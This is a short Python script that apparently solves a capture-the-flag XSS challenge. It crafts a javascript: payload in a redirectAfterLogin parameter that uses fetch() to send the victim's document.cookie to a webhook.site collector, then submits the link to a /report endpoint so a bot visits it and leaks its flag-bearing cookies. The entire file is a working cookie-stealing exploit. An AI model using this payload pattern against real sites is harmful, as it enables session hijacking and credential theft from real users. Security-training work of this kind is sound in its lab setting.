import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite

import urllib.parse

BASE_URL = "https://xss-playground-4.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()

    # https://xss-playground-4.quoccacorp.com/assets/index-DzvJf6sH.js
    # Find "redirectAfterLogin"
    def get_js_bundle_url(self) -> str:
        from bs4 import BeautifulSoup
        response = self.session.get(BASE_URL, allow_redirects=False)
        soup = BeautifulSoup(response.text, "html.parser")
        script_src = soup.find("script", src=True)["src"]
        source_code_url = f"{BASE_URL}{script_src}"
        return source_code_url

    def main(self):
        PAYLOAD = f"javascript:fetch(`{self.webhooksite.url}?q=${{document.cookie}}`)"
        encoded_payload = urllib.parse.quote(PAYLOAD)

        report_url = f"{BASE_URL}/find-logged-in-page?redirectAfterLogin={encoded_payload}"
        self.session.post(f"{BASE_URL}/report", data={"url": report_url})

        self.webhooksite.find_flags()

if __name__ == "__main__":
    Solver().main()
